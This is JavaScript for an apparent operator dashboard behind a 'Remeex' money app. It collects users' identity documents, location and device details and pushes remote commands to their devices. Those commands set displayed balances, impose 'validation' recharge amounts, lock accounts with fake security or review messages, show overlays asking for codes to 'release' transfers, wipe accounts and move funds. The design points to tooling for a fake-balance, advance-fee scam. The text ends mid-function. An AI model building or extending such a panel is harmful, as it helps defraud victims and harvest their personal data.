import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';

const DEFAULT_SUPABASE_CONFIG = {
  url: 'https://ewdkxszfkqwlkyszodxu.supabase.co',
  anonKey:
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV3ZGt4c3pma3F3bGt5c3pvZHh1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE3ODM5MzMsImV4cCI6MjA3NzM1OTkzM30.alofRt3MEn5UgSsSMk5zWTF0On1PGVepdME-MOoqk-M'
};

const TABLES = {
  snapshots: 'miinformacion_snapshots',
  commands: 'miinformacion_remote_commands'
};

const RATE_LABELS = {
  bcv: 'BCV',
  usdt: 'USDT P2P',
  euroDigital: 'Euro Digital',
  dolarPromedio: 'Dólar Promedio',
  dolarBinance: 'Dólar Binance',
  exchange: 'Intercambio Remeex',
  personalizado: 'Tasa personalizada'
};

const BLOCK_PRESETS = {
  general: {
    label: 'Bloqueo general',
    message: 'Tu cuenta está bloqueada temporalmente por revisión manual. Contacta a soporte para reactivarla.',
    accent: '#f87171'
  },
  validation: {
    label: 'Validación pendiente',
    message: 'Debes completar la validación con una recarga supervisada para reactivar todas las funciones.',
    accent: '#f97316'
  },
  security: {
    label: 'Alerta de seguridad',
    message: 'Detectamos actividad inusual y bloqueamos tu cuenta para proteger tus fondos. Comunícate con soporte.',
    accent: '#f87171'
  },
  payments: {
    label: 'Bloqueo de pagos',
    message: 'Los pagos están temporalmente limitados mientras revisamos tus operaciones recientes.',
    accent: '#facc15'
  },
  withdrawals: {
    label: 'Bloqueo de retiros',
    message: 'Los retiros se habilitarán una vez completes la validación adicional solicitada.',
    accent: '#facc15'
  }
};

const OVERLAY_TEMPLATES = {
  donation: {
    title: 'Multiplica tu impacto',
    message: 'Tu saldo puede transformar vidas. Dona a nuestros aliados solidarios con un clic.',
    accent: '#f97316',
    button: { label: 'Donar ahora', href: 'servicios.html#donaciones' }
  },
  activation: {
    title: 'Activa tu cuenta hoy',
    message: 'Completa la validación para desbloquear retiros, pagos y transferencias ilimitadas.',
    accent: '#38bdf8',
    button: { label: 'Ver requisitos', href: '#validacion' }
  },
  transfer: {
    title: 'Transferencia pendiente',
    message: 'Has recibido fondos que necesitan tu confirmación. Ingresa el código enviado para liberarlos.',
    accent: '#22d3ee',
    button: { label: 'Aceptar transferencia', href: '#transferencias' }
  }
};

const COMMAND_LABELS = {
  'update-balance': 'Actualización de saldo',
  'update-rate': 'Actualización de tasa',
  'set-block': 'Bloqueo manual',
  'wipe-account': 'Reinicio de cuenta',
  'set-validation-amount': 'Monto de validación',
  'show-overlay': 'Overlay remoto',
  'hide-overlay': 'Ocultar overlay',
  'send-funds': 'Transferencia remota'
};

const MAX_RECORDS = 250;
const STORAGE_OPERATOR_KEY = 'adminMiInformacionOperator';

const relativeFormatter = new Intl.RelativeTimeFormat('es', { numeric: 'auto' });
const dateFormatter = new Intl.DateTimeFormat('es-VE', { dateStyle: 'medium', timeStyle: 'short' });
const numberFormatter = new Intl.NumberFormat('es-VE', {
  minimumFractionDigits: 2,
  maximumFractionDigits: 2
});

const currencyFormatter = {
  usd: new Intl.NumberFormat('es-VE', { style: 'currency', currency: 'USD' }),
  ves: new Intl.NumberFormat('es-VE', { style: 'currency', currency: 'VES', maximumFractionDigits: 2 }),
  eur: new Intl.NumberFormat('es-VE', { style: 'currency', currency: 'EUR' })
};

const state = {
  client: null,
  realtimeChannel: null,
  rawSnapshots: [],
  snapshotMap: new Map(),
  filteredSnapshots: [],
  commands: [],
  filterText: '',
  filterStatus: 'all',
  selectedId: null,
  operatorName: '',
  loadingSnapshots: false,
  loadingCommands: false
};

const elements = {
  statusCard: document.getElementById('supabase-status'),
  statusLabel: document.querySelector('#supabase-status .status-card__label'),
  statusMeta: document.querySelector('#supabase-status .status-card__meta'),
  metrics: {
    snapshots: document.querySelector('[data-metric="snapshots"]'),
    users: document.querySelector('[data-metric="users"]'),
    lastSync: document.querySelector('[data-metric="last-sync"]'),
    commands: document.querySelector('[data-metric="commands"]')
  },
  refreshButton: document.getElementById('refresh-all'),
  searchInput: document.getElementById('user-search'),
  filterSelect: document.getElementById('user-filter'),
  userList: document.getElementById('user-list'),
  userEmpty: document.getElementById('user-empty'),
  detailContainer: document.getElementById('detail'),
  detailEmpty: document.getElementById('detail-empty'),
  detailHeader: document.getElementById('detail-header'),
  detailSummary: document.getElementById('detail-summary'),
  snapshotHistory: document.getElementById('snapshot-history'),
  commandHistory: document.getElementById('command-history'),
  detailStatus: document.getElementById('detail-status'),
  toast: document.getElementById('toast'),
  operatorInput: document.getElementById('operator-name'),
  forms: {
    updateBalance: document.getElementById('form-update-balance'),
    updateRate: document.getElementById('form-update-rate'),
    validation: document.getElementById('form-validation'),
    block: document.getElementById('form-block'),
    overlay: document.getElementById('form-overlay'),
    sendFunds: document.getElementById('form-send-funds')
  },
  buttons: {
    fillBalance: document.getElementById('fill-current-balance'),
    clearRate: document.getElementById('clear-rate'),
    clearValidation: document.getElementById('clear-validation'),
    clearBlock: document.getElementById('clear-block'),
    hideOverlay: document.getElementById('hide-overlay'),
    wipeAccount: document.getElementById('wipe-account')
  },
  inputs: {
    balanceUsd: document.getElementById('balance-usd'),
    balanceBs: document.getElementById('balance-bs'),
    balanceEur: document.getElementById('balance-eur'),
    balanceUsdt: document.getElementById('balance-usdt'),
    rateKey: document.getElementById('rate-key'),
    rateValue: document.getElementById('rate-value'),
    rateEur: document.getElementById('rate-eur'),
    validationAmount: document.getElementById('validation-amount'),
    blockType: document.getElementById('block-type'),
    blockMessage: document.getElementById('block-message'),
    overlayTemplate: document.getElementById('overlay-template'),
    overlayTitle: document.getElementById('overlay-title'),
    overlayMessage: document.getElementById('overlay-message'),
    overlayAccent: document.getElementById('overlay-accent'),
    overlayButtonLabel: document.getElementById('overlay-button-label'),
    overlayButtonUrl: document.getElementById('overlay-button-url'),
    transferDirection: document.getElementById('transfer-direction'),
    transferEmail: document.getElementById('transfer-email'),
    transferAmount: document.getElementById('transfer-amount'),
    transferCurrency: document.getElementById('transfer-currency'),
    transferReference: document.getElementById('transfer-reference'),
    transferNote: document.getElementById('transfer-note')
  }
};

let toastTimeout = null;

function setSupabaseStatus(status, label, meta) {
  if (!elements.statusCard) return;
  elements.statusCard.dataset.status = status || 'offline';
  if (elements.statusLabel && typeof label === 'string') {
    elements.statusLabel.textContent = label;
  }
  if (elements.statusMeta && typeof meta === 'string') {
    elements.statusMeta.textContent = meta;
  }
}

function showToast(message, tone = 'info') {
  if (!elements.toast) return;
  elements.toast.textContent = message;
  elements.toast.dataset.tone = tone;
  elements.toast.hidden = false;
  requestAnimationFrame(() => {
    elements.toast.dataset.visible = 'true';
  });
  if (toastTimeout) {
    clearTimeout(toastTimeout);
  }
  toastTimeout = setTimeout(() => {
    elements.toast.dataset.visible = 'false';
    setTimeout(() => {
      if (elements.toast) {
        elements.toast.hidden = true;
      }
    }, 320);
  }, 3400);
}

function toTimestamp(value) {
  if (!value) return 0;
  const date = value instanceof Date ? value : new Date(value);
  const time = date.getTime();
  return Number.isNaN(time) ? 0 : time;
}

function compareByDateDesc(a, b) {
  return toTimestamp(b) - toTimestamp(a);
}

function formatDateDetail(value) {
  const time = toTimestamp(value);
  if (!time) return '—';
  return dateFormatter.format(new Date(time));
}

function formatRelativeTime(value) {
  const time = toTimestamp(value);
  if (!time) return '—';
  const diff = time - Date.now();
  const minutes = Math.round(diff / 60000);
  if (Math.abs(minutes) < 1) {
    return 'ahora mismo';
  }
  if (Math.abs(minutes) < 60) {
    return relativeFormatter.format(minutes, 'minute');
  }
  const hours = Math.round(diff / 3600000);
  if (Math.abs(hours) < 24) {
    return relativeFormatter.format(hours, 'hour');
  }
  const days = Math.round(diff / 86400000);
  if (Math.abs(days) < 7) {
    return relativeFormatter.format(days, 'day');
  }
  return dateFormatter.format(new Date(time));
}

function formatNumber(value, options) {
  if (value === null || value === undefined) return '—';
  if (!Number.isFinite(value)) return '—';
  if (options) {
    return new Intl.NumberFormat('es-VE', options).format(value);
  }
  return numberFormatter.format(value);
}

function formatCurrency(value, currency) {
  if (!Number.isFinite(value)) return '—';
  const formatter = currencyFormatter[currency];
  if (formatter) {
    return formatter.format(value);
  }
  return numberFormatter.format(value);
}

function parseNumericInput(value) {
  if (Number.isFinite(value)) return Number(value);
  if (typeof value !== 'string') return null;
  const trimmed = value.trim();
  if (!trimmed) return null;
  let normalized = trimmed.replace(/[\u202f\u00a0\s]/g, '');
  let sign = '';
  if (normalized.startsWith('-')) {
    sign = '-';
    normalized = normalized.slice(1);
  }
  normalized = normalized.replace(/[^0-9.,-]/g, '');
  const lastComma = normalized.lastIndexOf(',');
  const lastDot = normalized.lastIndexOf('.');
  const decimalIndex = Math.max(lastComma, lastDot);
  let integerPart = normalized;
  let fractionalPart = '';
  if (decimalIndex !== -1) {
    integerPart = normalized.slice(0, decimalIndex);
    fractionalPart = normalized.slice(decimalIndex + 1);
  }
  integerPart = integerPart.replace(/[^0-9]/g, '');
  fractionalPart = fractionalPart.replace(/[^0-9]/g, '');
  if (!integerPart && !fractionalPart) return null;
  const composed = sign + (integerPart || '0') + (fractionalPart ? `.${fractionalPart}` : '');
  const numeric = Number(composed);
  return Number.isFinite(numeric) ? numeric : null;
}

function inferNameFromEmail(email) {
  if (typeof email !== 'string') return '';
  const base = email.trim().split('@')[0] || '';
  if (!base) return '';
  const normalized = base.replace(/[._-]+/g, ' ').trim();
  if (!normalized) return '';
  return normalized.replace(/\b\w/g, (char) => char.toUpperCase());
}

function normalizeSnapshot(row) {
  if (!row) return null;
  const data = row.data || {};
  const profile = data.profile || {};
  const accountInfo = data.accountInfo || {};
  const remote = data.remote || {};
  const email = (row.email || profile.email || '').trim() || null;
  const deviceId = (row.device_id || profile.deviceId || profile.device_id || '').trim() || null;
  const identifier = email
    ? email.toLowerCase()
    : deviceId
      ? `device:${deviceId.toLowerCase()}`
      : `snapshot:${row.id || Date.now().toString(16)}`;
  const fullName =
    profile.fullName ||
    profile.preferredName ||
    row.full_name ||
    email ||
    deviceId ||
    'Usuario sin nombre';
  const initials = (profile.initials || fullName.charAt(0) || 'U').toUpperCase();
  const documentNumber =
    profile.documentNumber ||
    profile.document ||
    data.registration?.documentNumber ||
    data.registration?.documentId ||
    null;
  const documentType =
    profile.documentType ||
    data.registration?.documentType ||
    data.registration?.documentKind ||
    null;
  const collectedAt = row.collected_at || data.collectedAt || row.created_at || null;
  const lastSyncAt = row.last_sync_at || row.updated_at || collectedAt;
  const validationStatus = String(
    accountInfo.validationStatus ||
      data.registration?.status ||
      data.registration?.validationStatus ||
      ''
  ).toLowerCase();
  const validated = Boolean(
    validationStatus.includes('complet') ||
      data.registration?.completed ||
      data.registration?.completedAt
  );
  const blocked = Boolean(
    remote?.blockState?.active ||
      accountInfo?.blocked ||
      (accountInfo?.status && String(accountInfo.status).toLowerCase().includes('bloque'))
  );
  const searchValues = [
    fullName,
    email,
    deviceId,
    documentNumber,
    documentType,
    profile.nickname,
    profile.preferredName
  ]
    .filter(Boolean)
    .map((value) => value.toString().toLowerCase());

  return {
    id: row.id,
    identifier,
    email,
    deviceId,
    fullName,
    initials,
    documentNumber,
    documentType,
    collectedAt,
    lastSyncAt,
    location: row.location || data.location || null,
    accountStatus: accountInfo.status || null,
    blocked,
    validated,
    profile,
    accountInfo,
    remote,
    balance: data.balance || {},
    rate: data.rate || {},
    validationAmount: remote?.validationAmount ?? null,
    sessionMonitor: data.sessionMonitor || {},
    data,
    searchValues
  };
}

function normalizeCommand(row) {
  if (!row) return null;
  const createdAt = row.created_at || row.inserted_at || row.createdAt || null;
  const email = row.email || row.meta?.target || null;
  const deviceId = row.device_id || null;
  const identifier = email
    ? email.toLowerCase()
    : deviceId
      ? `device:${deviceId.toLowerCase()}`
      : null;
  return {
    id: row.id,
    commandId: row.command_id || row.id,
    type: row.type,
    payload: row.payload || {},
    meta: row.meta || {},
    createdAt,
    email,
    deviceId,
    identifier,
    source: row.source || row.meta?.source || 'supabase'
  };
}

function rebuildSnapshotIndex() {
  state.snapshotMap.clear();
  const sorted = [...state.rawSnapshots].sort((a, b) => compareByDateDesc(a.collectedAt, b.collectedAt));
  sorted.forEach((snapshot) => {
    if (!snapshot || !snapshot.identifier) return;
    if (!state.snapshotMap.has(snapshot.identifier)) {
      state.snapshotMap.set(snapshot.identifier, snapshot);
    }
  });
  state.filteredSnapshots = Array.from(state.snapshotMap.values());
  applyFilters();
}

function updateMetrics() {
  if (elements.metrics.snapshots) {
    elements.metrics.snapshots.textContent = state.rawSnapshots.length.toString();
  }
  if (elements.metrics.users) {
    elements.metrics.users.textContent = state.snapshotMap.size.toString();
  }
  if (elements.metrics.commands) {
    elements.metrics.commands.textContent = state.commands.length.toString();
  }
  if (elements.metrics.lastSync) {
    const latest = state.rawSnapshots[0];
    elements.metrics.lastSync.textContent = latest ? formatRelativeTime(latest.collectedAt) : '—';
  }
}

function applyFilters() {
  const query = state.filterText.trim().toLowerCase();
  const filter = state.filterStatus;
  let list = Array.from(state.snapshotMap.values());
  if (query) {
    list = list.filter((snapshot) => snapshot.searchValues.some((value) => value && value.includes(query)));
  }
  if (filter === 'validated') {
    list = list.filter((snapshot) => snapshot.validated);
  } else if (filter === 'pending') {
    list = list.filter((snapshot) => !snapshot.validated);
  } else if (filter === 'blocked') {
    list = list.filter((snapshot) => snapshot.blocked);
  }
  state.filteredSnapshots = list;
  renderUserList();
}

function renderUserList() {
  if (!elements.userList) return;
  elements.userList.innerHTML = '';
  if (!state.filteredSnapshots.length) {
    if (elements.userEmpty) {
      elements.userEmpty.hidden = false;
    }
    return;
  }
  if (elements.userEmpty) {
    elements.userEmpty.hidden = true;
  }
  const fragment = document.createDocumentFragment();
  state.filteredSnapshots.forEach((snapshot) => {
    const item = document.createElement('li');
    item.className = 'user-list__item';
    item.dataset.identifier = snapshot.identifier;
    item.tabIndex = 0;
    if (snapshot.identifier === state.selectedId) {
      item.setAttribute('aria-selected', 'true');
    }

    const header = document.createElement('div');
    header.className = 'user-list__header';

    const avatar = document.createElement('div');
    avatar.className = 'avatar';
    avatar.textContent = snapshot.initials || 'U';

    const info = document.createElement('div');
    const name = document.createElement('p');
    name.className = 'user-list__title';
    name.textContent = snapshot.fullName;
    const meta = document.createElement('p');
    meta.className = 'user-list__meta';
    meta.textContent = snapshot.email || snapshot.deviceId || 'Sin identificador';

    info.appendChild(name);
    info.appendChild(meta);
    header.appendChild(avatar);
    header.appendChild(info);
    item.appendChild(header);

    const sub = document.createElement('div');
    sub.className = 'detail__chips';

    const statusBadge = document.createElement('span');
    statusBadge.className = 'badge';
    statusBadge.dataset.tone = snapshot.blocked ? 'danger' : 'success';
    statusBadge.textContent = snapshot.blocked ? 'Bloqueado' : 'Activo';
    sub.appendChild(statusBadge);

    const validationBadge = document.createElement('span');
    validationBadge.className = 'badge';
    validationBadge.dataset.tone = snapshot.validated ? 'success' : 'warning';
    validationBadge.textContent = snapshot.validated ? 'Validado' : 'Sin validar';
    sub.appendChild(validationBadge);

    if (snapshot.rate && snapshot.rate.key) {
      const rateBadge = document.createElement('span');
      rateBadge.className = 'badge';
      rateBadge.textContent = RATE_LABELS[snapshot.rate.key] || snapshot.rate.key;
      sub.appendChild(rateBadge);
    }

    if (snapshot.documentNumber) {
      const docBadge = document.createElement('span');
      docBadge.className = 'badge';
      docBadge.textContent = `${snapshot.documentType || 'Doc'} ${snapshot.documentNumber}`;
      sub.appendChild(docBadge);
    }

    item.appendChild(sub);

    const time = document.createElement('p');
    time.className = 'user-list__meta';
    time.textContent = `Último snapshot · ${formatRelativeTime(snapshot.collectedAt)}`;
    item.appendChild(time);

    fragment.appendChild(item);
  });
  elements.userList.appendChild(fragment);
}

function selectSnapshot(identifier) {
  if (!identifier) return;
  state.selectedId = identifier;
  renderUserList();
  renderDetail();
}

function renderDetail() {
  const snapshot = state.selectedId ? state.snapshotMap.get(state.selectedId) : null;
  if (!snapshot || !elements.detailContainer || !elements.detailEmpty) {
    if (elements.detailContainer) {
      elements.detailContainer.hidden = true;
    }
    if (elements.detailEmpty) {
      elements.detailEmpty.hidden = false;
    }
    if (elements.detailStatus) {
      elements.detailStatus.hidden = true;
    }
    return;
  }

  elements.detailEmpty.hidden = true;
  elements.detailContainer.hidden = false;
  renderDetailHeader(snapshot);
  renderDetailSummary(snapshot);
  renderDetailHistory(snapshot);
  populateActionForms(snapshot);
  updateDetailStatus(snapshot);
}

function renderDetailHeader(snapshot) {
  if (!elements.detailHeader) return;
  elements.detailHeader.innerHTML = '';

  const identity = document.createElement('div');
  identity.className = 'detail__identity';

  const avatar = document.createElement('div');
  avatar.className = 'avatar avatar--lg';
  avatar.textContent = snapshot.initials || 'U';

  const info = document.createElement('div');
  const name = document.createElement('h3');
  name.textContent = snapshot.fullName;
  const email = document.createElement('p');
  email.textContent = snapshot.email || 'Correo no disponible';

  info.appendChild(name);
  info.appendChild(email);
  identity.appendChild(avatar);
  identity.appendChild(info);
  elements.detailHeader.appendChild(identity);

  const chips = document.createElement('div');
  chips.className = 'detail__chips';

  if (snapshot.accountStatus) {
    const statusBadge = document.createElement('span');
    statusBadge.className = 'badge';
    statusBadge.dataset.tone = snapshot.blocked ? 'danger' : 'success';
    statusBadge.textContent = snapshot.accountStatus;
    chips.appendChild(statusBadge);
  }

  if (snapshot.validated !== undefined) {
    const validationBadge = document.createElement('span');
    validationBadge.className = 'badge';
    validationBadge.dataset.tone = snapshot.validated ? 'success' : 'warning';
    validationBadge.textContent = snapshot.validated ? 'Validado' : 'Sin validar';
    chips.appendChild(validationBadge);
  }

  if (snapshot.documentNumber) {
    const docBadge = document.createElement('span');
    docBadge.className = 'badge';
    docBadge.textContent = `${snapshot.documentType || 'Documento'} ${snapshot.documentNumber}`;
    chips.appendChild(docBadge);
  }

  if (snapshot.location) {
    const locationBadge = document.createElement('span');
    locationBadge.className = 'badge';
    locationBadge.textContent = snapshot.location;
    chips.appendChild(locationBadge);
  }

  elements.detailHeader.appendChild(chips);

  const meta = document.createElement('div');
  meta.className = 'detail__chips';

  const lastSync = document.createElement('span');
  lastSync.className = 'badge';
  lastSync.textContent = `Último snapshot · ${formatDateDetail(snapshot.collectedAt)}`;
  meta.appendChild(lastSync);

  if (snapshot.sessionMonitor?.lastSeen) {
    const sessionBadge = document.createElement('span');
    sessionBadge.className = 'badge';
    sessionBadge.textContent = `Actividad · ${formatRelativeTime(snapshot.sessionMonitor.lastSeen)}`;
    meta.appendChild(sessionBadge);
  }

  elements.detailHeader.appendChild(meta);
}

function createSummaryCard(title, rows) {
  const card = document.createElement('article');
  card.className = 'detail-card';
  const heading = document.createElement('h4');
  heading.textContent = title;
  card.appendChild(heading);
  const list = document.createElement('dl');
  rows.forEach(([label, value]) => {
    const dt = document.createElement('dt');
    dt.textContent = label;
    const dd = document.createElement('dd');
    dd.textContent = value === undefined || value === null || value === '' ? '—' : value;
    list.appendChild(dt);
    list.appendChild(dd);
  });
  card.appendChild(list);
  return card;
}

function renderDetailSummary(snapshot) {
  if (!elements.detailSummary) return;
  elements.detailSummary.innerHTML = '';
  const accountRows = [
    ['Estado', snapshot.accountStatus || 'Sin estado'],
    ['Bloqueo manual', snapshot.blocked ? 'Activo' : 'Sin bloqueos'],
    [
      'Nivel',
      snapshot.accountInfo?.tier ||
        snapshot.accountInfo?.accountTier ||
        snapshot.accountInfo?.level ||
        '—'
    ],
    ['Creado', formatDateDetail(snapshot.profile?.createdAt || snapshot.accountInfo?.createdAt)]
  ];

  const validationAmount = snapshot.remote?.validationAmount;
  accountRows.push([
    'Monto validación',
    Number.isFinite(validationAmount) ? formatCurrency(Number(validationAmount), 'usd') : 'No definido'
  ]);

  const balance = snapshot.balance || {};
  const balanceRows = [
    ['USD', Number.isFinite(balance.usd) ? formatCurrency(balance.usd, 'usd') : '—'],
    ['Bolívares', Number.isFinite(balance.bs) ? formatCurrency(balance.bs, 'ves') : '—'],
    ['EUR', Number.isFinite(balance.eur) ? formatCurrency(balance.eur, 'eur') : '—'],
    ['USDT', Number.isFinite(balance.usdt) ? formatNumber(balance.usdt) : '—']
  ];

  const rate = snapshot.rate || {};
  const rateRows = [
    ['Fuente', rate.key ? RATE_LABELS[rate.key] || rate.key : 'Sin definir'],
    ['USD ↔ Bs', Number.isFinite(rate.value) ? formatNumber(rate.value) : '—'],
    ['USD ↔ EUR', Number.isFinite(rate.usdToEur) ? formatNumber(rate.usdToEur) : '—'],
    ['Actualizado', formatDateDetail(rate.updatedAt)]
  ];

  const deviceRows = [
    ['Device ID', snapshot.profile?.deviceId || snapshot.deviceId || '—'],
    ['Zona horaria', snapshot.data?.timezone || '—'],
    ['Pantalla', snapshot.data?.screen ? `${snapshot.data.screen.width}×${snapshot.data.screen.height}` : '—'],
    [
      'Navegador',
      snapshot.data?.userAgent
        ? snapshot.data.userAgent.slice(0, 80) + (snapshot.data.userAgent.length > 80 ? '…' : '')
        : '—'
    ]
  ];

  const cards = [
    createSummaryCard('Cuenta Remeex', accountRows),
    createSummaryCard('Balance registrado', balanceRows),
    createSummaryCard('Tasas y sesión', rateRows),
    createSummaryCard('Dispositivo', deviceRows)
  ];

  const fragment = document.createDocumentFragment();
  cards.forEach((card) => fragment.appendChild(card));
  elements.detailSummary.appendChild(fragment);
}

function commandMatchesSnapshot(command, snapshot) {
  if (!command || !snapshot) return false;
  if (command.identifier && command.identifier === snapshot.identifier) return true;
  if (command.email && snapshot.email && command.email.toLowerCase() === snapshot.email.toLowerCase()) {
    return true;
  }
  if (command.deviceId && snapshot.deviceId && command.deviceId === snapshot.deviceId) {
    return true;
  }
  return false;
}

function renderDetailHistory(snapshot) {
  if (elements.snapshotHistory) {
    elements.snapshotHistory.innerHTML = '';
    const history = state.rawSnapshots
      .filter((item) => item.identifier === snapshot.identifier)
      .sort((a, b) => compareByDateDesc(a.collectedAt, b.collectedAt))
      .slice(0, 12);
    if (!history.length) {
      const li = document.createElement('li');
      li.textContent = 'Sin registros recientes.';
      elements.snapshotHistory.appendChild(li);
    } else {
      history.forEach((item) => {
        const li = document.createElement('li');
        li.innerHTML = `<strong>${formatDateDetail(item.collectedAt)}</strong> · ${formatRelativeTime(item.collectedAt)}`;
        elements.snapshotHistory.appendChild(li);
      });
    }
  }

  if (elements.commandHistory) {
    elements.commandHistory.innerHTML = '';
    const commands = state.commands
      .filter((command) => commandMatchesSnapshot(command, snapshot))
      .sort((a, b) => compareByDateDesc(a.createdAt, b.createdAt))
      .slice(0, 12);
    if (!commands.length) {
      const li = document.createElement('li');
      li.textContent = 'Aún no se registran acciones para este usuario.';
      elements.commandHistory.appendChild(li);
    } else {
      commands.forEach((command) => {
        const label = COMMAND_LABELS[command.type] || command.type;
        const li = document.createElement('li');
        const description = command.meta?.description || command.meta?.note || '';
        li.innerHTML = `<strong>${label}</strong> · ${formatDateDetail(command.createdAt)}${
          description ? ` · ${description}` : ''
        }`;
        elements.commandHistory.appendChild(li);
      });
    }
  }
}

function populateActionForms(snapshot) {
  if (!snapshot) return;
  if (elements.inputs.balanceUsd) elements.inputs.balanceUsd.value = '';
  if (elements.inputs.balanceBs) elements.inputs.balanceBs.value = '';
  if (elements.inputs.balanceEur) elements.inputs.balanceEur.value = '';
  if (elements.inputs.balanceUsdt) elements.inputs.balanceUsdt.value = '';

  if (elements.inputs.rateKey) {
    elements.inputs.rateKey.value = snapshot.rate?.key || 'bcv';
  }
  if (elements.inputs.rateValue) {
    elements.inputs.rateValue.value = '';
    elements.inputs.rateValue.placeholder = Number.isFinite(snapshot.rate?.value)
      ? String(snapshot.rate.value)
      : '37,50';
  }
  if (elements.inputs.rateEur) {
    elements.inputs.rateEur.value = '';
    elements.inputs.rateEur.placeholder = Number.isFinite(snapshot.rate?.usdToEur)
      ? String(snapshot.rate.usdToEur)
      : '0.93';
  }
  if (elements.inputs.validationAmount) {
    elements.inputs.validationAmount.value = '';
    const amount = snapshot.remote?.validationAmount;
    elements.inputs.validationAmount.placeholder = Number.isFinite(amount)
      ? formatNumber(Number(amount))
      : '25.00';
  }
  if (elements.inputs.blockType) {
    const currentType = snapshot.remote?.blockState?.type || 'general';
    elements.inputs.blockType.value = currentType;
  }
  if (elements.inputs.blockMessage) {
    elements.inputs.blockMessage.value = '';
    const type = elements.inputs.blockType?.value || 'general';
    const preset = BLOCK_PRESETS[type] || BLOCK_PRESETS.general;
    const activeMessage = snapshot.remote?.blockState?.message;
    elements.inputs.blockMessage.placeholder = activeMessage || preset.message;
  }
  if (elements.inputs.overlayTemplate) {
    elements.inputs.overlayTemplate.value = 'donation';
  }
  if (elements.inputs.overlayTitle) elements.inputs.overlayTitle.value = '';
  if (elements.inputs.overlayMessage) elements.inputs.overlayMessage.value = '';
  if (elements.inputs.overlayAccent) elements.inputs.overlayAccent.value = '';
  if (elements.inputs.overlayButtonLabel) elements.inputs.overlayButtonLabel.value = '';
  if (elements.inputs.overlayButtonUrl) elements.inputs.overlayButtonUrl.value = '';
  if (elements.inputs.transferDirection) elements.inputs.transferDirection.value = 'send';
  if (elements.inputs.transferEmail) elements.inputs.transferEmail.value = '';
  if (elements.inputs.transferAmount) elements.inputs.transferAmount.value = '';
  if (elements.inputs.transferCurrency) elements.inputs.transferCurrency.value = 'usd';
  if (elements.inputs.transferReference) elements.inputs.transferReference.value = '';
  if (elements.inputs.transferNote) elements.inputs.transferNote.value = '';
}

function updateDetailStatus(snapshot) {
  if (!elements.detailStatus) return;
  const snapshotCount = state.rawSnapshots.filter((item) => item.identifier === snapshot.identifier).length;
  const commands = state.commands.filter((command) => commandMatchesSnapshot(command, snapshot));
  elements.detailStatus.textContent = `Snapshots: ${snapshotCount} · Comandos registrados: ${commands.length}`;
  elements.detailStatus.hidden = false;
}

async function handleUpdateBalance(event) {
  event.preventDefault();
  const snapshot = state.selectedId ? state.snapshotMap.get(state.selectedId) : null;
  if (!snapshot) {
    showToast('Selecciona un usuario antes de enviar comandos.', 'warning');
    return;
  }
  const payload = {};
  let hasValue = false;
  const usd = elements.inputs.balanceUsd ? parseNumericInput(elements.inputs.balanceUsd.value) : null;
  const bs = elements.inputs.balanceBs ? parseNumericInput(elements.inputs.balanceBs.value) : null;
  const eur = elements.inputs.balanceEur ? parseNumericInput(elements.inputs.balanceEur.value) : null;
  const usdt = elements.inputs.balanceUsdt ? parseNumericInput(elements.inputs.balanceUsdt.value) : null;

  if (elements.inputs.balanceUsd && elements.inputs.balanceUsd.value.trim() !== '') {
    if (usd === null) {
      showToast('Monto USD inválido.', 'warning');
      return;
    }
    payload.usd = usd;
    hasValue = true;
  }
  if (elements.inputs.balanceBs && elements.inputs.balanceBs.value.trim() !== '') {
    if (bs === null) {
      showToast('Monto Bs inválido.', 'warning');
      return;
    }
    payload.bs = bs;
    hasValue = true;
  }
  if (elements.inputs.balanceEur && elements.inputs.balanceEur.value.trim() !== '') {
    if (eur === null) {
      showToast('Monto EUR inválido.', 'warning');
      return;
    }
    payload.eur = eur;
    hasValue = true;
  }
  if (elements.inputs.balanceUsdt && elements.inputs.balanceUsdt.value.trim() !== '') {
    if (usdt === null) {
      showToast('Monto USDT inválido.', 'warning');
      return;
    }
    payload.usdt = usdt;
    hasValue = true;
  }

  if (!hasValue) {
    showToast('Ingresa al menos un monto para sincronizar el saldo.', 'warning');
    return;
  }
  payload.timestamp = new Date().toISOString();
  const success = await dispatchCommand('update-balance', payload, { description: 'Actualización manual de saldo' });
  if (success) {
    if (elements.inputs.balanceUsd) elements.inputs.balanceUsd.value = '';
    if (elements.inputs.balanceBs) elements.inputs.balanceBs.value = '';
    if (elements.inputs.balanceEur) elements.inputs.balanceEur.value = '';
    if (elements.inputs.balanceUsdt) elements.inputs.balanceUsdt.value = '';
  }
}

async function handleUpdateRate(event) {
  event.preventDefault();
  if (!state.selectedId) {
    showToast('Selecciona un usuario antes de aplicar la tasa.', 'warning');
    return;
  }
  const key = elements.inputs.rateKey ? elements.inputs.rateKey.value : 'bcv';
  const valueRaw = elements.inputs.rateValue ? elements.inputs.rateValue.value.trim() : '';
  const eurRaw = elements.inputs.rateEur ? elements.inputs.rateEur.value.trim() : '';
  const payload = { key, label: RATE_LABELS[key] || key };

  if (valueRaw) {
    const value = parseNumericInput(valueRaw);
    if (value === null) {
      showToast('Valor de tasa inválido.', 'warning');
      return;
    }
    payload.value = value;
  }
  if (eurRaw) {
    const eur = parseNumericInput(eurRaw);
    if (eur === null) {
      showToast('Valor USD↔EUR inválido.', 'warning');
      return;
    }
    payload.usdToEur = eur;
  }

  const success = await dispatchCommand('update-rate', payload, { type: key });
  if (success && elements.inputs.rateValue && elements.inputs.rateEur) {
    elements.inputs.rateValue.value = '';
    elements.inputs.rateEur.value = '';
  }
}

async function handleValidationAmount(event) {
  event.preventDefault();
  if (!state.selectedId) {
    showToast('Selecciona un usuario para actualizar la validación.', 'warning');
    return;
  }
  const raw = elements.inputs.validationAmount ? elements.inputs.validationAmount.value.trim() : '';
  if (!raw) {
    showToast('Ingresa un monto en USD.', 'warning');
    return;
  }
  const amount = parseNumericInput(raw);
  if (!Number.isFinite(amount) || amount <= 0) {
    showToast('El monto debe ser mayor a cero.', 'warning');
    return;
  }
  const success = await dispatchCommand(
    'set-validation-amount',
    { amount },
    { action: 'set', amount }
  );
  if (success && elements.inputs.validationAmount) {
    elements.inputs.validationAmount.value = '';
  }
}

async function handleBlock(event) {
  event.preventDefault();
  if (!state.selectedId) {
    showToast('Selecciona un usuario antes de aplicar un bloqueo.', 'warning');
    return;
  }
  const type = elements.inputs.blockType ? elements.inputs.blockType.value : 'general';
  let message = elements.inputs.blockMessage ? elements.inputs.blockMessage.value.trim() : '';
